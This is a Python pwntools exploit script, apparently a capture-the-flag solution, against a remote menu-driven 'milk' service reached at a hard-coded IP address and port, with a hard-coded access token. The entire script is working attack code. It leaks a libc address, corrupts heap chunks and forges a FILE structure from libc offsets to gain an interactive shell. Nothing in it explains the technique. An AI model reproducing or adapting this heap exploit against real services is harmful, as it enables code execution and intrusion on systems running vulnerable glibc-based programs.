from pwn import *

#s = remote('192.168.0.85',1234)
s = remote('52.27.136.59', 6969)
def put(dat,color):
  s.recvuntil('>')
  s.send('p\n')
  s.recvuntil('Input your flags (0-99): ')
  s.send(dat)
  s.recvuntil('Input your milk\'s color: ')
  s.send(color)
def remove(index):
  s.recvuntil('>')
  s.send('r\n')
  s.recvuntil('index :')
  s.send(str(index)+'\n')
def view():
  s.recvuntil('>')
  s.send('v\n')
def drink():
  s.recvuntil('>')
  s.send('d\n')
s.recvuntil('Token:')
s.send('MmSUJpq8peoc4YQd1KcljrJZHQb1VkHa\n')
raw_input()
for i in range(16):
  put('A'*0x56,'1234\n')
put('A'*0x56,'1234\n')
put('B'*0x56,'1234\n')
view()
libc = u64(s.recvuntil('B')[-9:-3]+'\x00\x00') - 0x3c3b88
log.info('LIBC : 0x%x'%libc)
remove(1)
dat = 'K'*0x18
dat += p64(libc+0x6ed80)
dat += 'K'*0x20
dat += p64(libc+0x45390)
dat += 'K'*0x8
dat += 'K'*0x6
dat += '\n'
put(dat,'1234\n')
drink()
put(p64(libc+0x3c46f8-0x10)+p64(libc+0x3c46f8-0x10)+p64(libc+0x3c46f8+0x100)[:-2]+'\n','1234\n')
put('A'*0x8+'\n','1234\n')
put('A'*0x8+'\n','1234\n')
dat = p64(0x6873)
dat += p64(0)
dat += p64(libc+0x3c46a3)*7
dat += p64(0)*4
dat += p64(libc+0x3c38e0)
dat += p64(1)
dat += p64(0xffffffffffffffff)
dat += p64(0x000000000a000000)
dat += p64(libc+0x3c5780)
dat += p64(0xffffffffffffffff)
dat += p64(0)
dat += p64(libc+0x3c37a0)
dat += p64(0)*3
dat += p64(0x00000000ffffffff)
dat += p64(0)
dat += p64(0xdeadbeef)
dat += p64(0xdeadbeef)
dat += p64(libc+0x3c4540)
s.send(dat+'\n')
s.interactive()
